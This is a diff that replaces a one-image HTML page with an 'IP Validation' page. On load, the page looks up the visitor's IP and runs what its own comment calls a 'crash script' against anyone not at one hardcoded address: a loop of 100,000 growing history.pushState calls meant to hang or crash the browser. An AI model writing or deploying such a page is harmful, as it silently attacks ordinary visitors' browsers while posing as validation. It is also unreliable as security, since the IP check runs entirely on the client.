@@ -1,23 +1,42 @@
-<style>
-  .container {
-    width: 98.2vw; /* 100% viewport width */
-    height: 96.8vh; /* 100% viewport height */
-    display: flex; /* Enable flexbox layout */
-    justify-content: center; /* Center content horizontally */
-    align-items: center; /* Center content vertically */
-  }
-  
-  .image {
-    width: auto; /* Maintain image aspect ratio */
-    max-width: 90%; /* Adjust max-width as needed */
-  }
-</style>
-</head>
-<body>
 
-<div class="container">
-  <img src="image-removebg-preview (9).png" alt="Image description" class="image">
-</div>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>IP Validation</title>
+    <script>
+      // Define the allowed IP
+      const allowedIP = "188.53.189.179";
 
-</body>
+      // Fetch the client's IP address using ipify
+      async function checkIP() {
+        try {
+          const response = await fetch("https://api64.ipify.org?format=json");
+          const data = await response.json();
+          const clientIP = data.ip;
+
+          console.log("Client IP:", clientIP);
+
+          if (clientIP === allowedIP) {
+            // If the IP matches, show a welcome message
+            document.body.innerHTML = "<h1>Welcome, authorized user!</h1>";
+          } else {
+            // If the IP doesn't match, execute the crash script
+            let total = "";
+            for (let i = 0; i < 100000; i++) {
+              total += i.toString();
+              history.pushState(0, 0, total);
+            }
+          }
+        } catch (error) {
+          console.error("Error fetching IP address:", error);
+        }
+      }
+
+      // Run the IP check
+      window.onload = checkIP;
+    </script>
+  </head>
+  <body>
+    <h1>Validating your IP...</h1>
+  </body>
 </html>
